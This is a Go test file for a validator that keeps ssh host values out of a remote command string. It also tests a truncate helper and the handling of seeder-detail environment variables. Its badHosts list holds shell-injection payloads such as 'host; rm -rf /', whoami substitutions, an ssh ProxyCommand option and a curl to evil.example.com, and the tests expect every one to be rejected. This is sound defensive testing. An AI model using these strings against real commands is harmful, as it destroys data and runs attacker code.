package main

import (
	"context"
	"strings"
	"testing"
)

func TestAssertSafe(t *testing.T) {
	if _, err := assertSafe("user@host.example.com", "HOST", hostRe); err != nil {
		t.Fatalf("unexpected error for a normal host: %v", err)
	}
	if _, err := assertSafe("127.0.0.1:9955", "API", apiRe); err != nil {
		t.Fatalf("unexpected error for a normal api addr: %v", err)
	}

	// Injection attempts must be refused, not smuggled into the remote
	// command string.
	badHosts := []string{
		"",
		"host; rm -rf /",
		"host`whoami`",
		"host$(whoami)",
		"-oProxyCommand=evil",
		"host && curl evil.example.com",
	}
	for _, bad := range badHosts {
		if _, err := assertSafe(bad, "HOST", hostRe); err == nil {
			t.Errorf("assertSafe(%q) expected error, got nil", bad)
		}
	}
}

// TestAssertSafeDistinguishesEmptyFromInvalid locks in issue #563: an unset
// (empty) value must produce a different, non-misleading message from a
// value that actually fails the character allowlist.
func TestAssertSafeDistinguishesEmptyFromInvalid(t *testing.T) {
	_, errEmpty := assertSafe("", "CYPHER_BRAIN_TON_SSH_HOST", hostRe)
	if errEmpty == nil {
		t.Fatal("expected an error for an empty value, got nil")
	}
	if strings.Contains(errEmpty.Error(), "contains characters") {
		t.Errorf("empty-value error should not claim invalid characters, got: %v", errEmpty)
	}
	if !strings.Contains(errEmpty.Error(), "not set") {
		t.Errorf("empty-value error should say the value is not set, got: %v", errEmpty)
	}

	_, errInvalid := assertSafe("host; rm -rf /", "CYPHER_BRAIN_TON_SSH_HOST", hostRe)
	if errInvalid == nil {
		t.Fatal("expected an error for an invalid value, got nil")
	}
	if !strings.Contains(errInvalid.Error(), "contains characters") {
		t.Errorf("invalid-value error should mention disallowed characters, got: %v", errInvalid)
	}
}

func TestTruncate(t *testing.T) {
	if got := truncate("  hello  ", 100); got != "hello" {
		t.Fatalf("truncate did not trim: %q", got)
	}
	if got := truncate(strings.Repeat("x", 10), 5); got != "xxxxx" {
		t.Fatalf("truncate(len10, 5) = %q, want 5 x's", got)
	}
}

// TestFetchSeederDetailsRequiresHostEnv checks that the missing-env-var path
// fails fast, before any ssh subprocess is spawned (fetchSeederDetails
// validates CYPHER_BRAIN_TON_SSH_HOST first).
func TestFetchSeederDetailsRequiresHostEnv(t *testing.T) {
	t.Setenv("CYPHER_BRAIN_TON_SSH_HOST", "")
	_, err := fetchSeederDetails(context.Background(), strings.Repeat("a", 64))
	if err == nil {
		t.Fatal("expected an error when CYPHER_BRAIN_TON_SSH_HOST is unset, got nil")
	}
}

func TestFetchSeederDetailsRejectsBadBagID(t *testing.T) {
	t.Setenv("CYPHER_BRAIN_TON_SSH_HOST", "user@example.com")
	_, err := fetchSeederDetails(context.Background(), "not-hex")
	if err == nil {
		t.Fatal("expected an error for a non-hex bag id, got nil")
	}
}
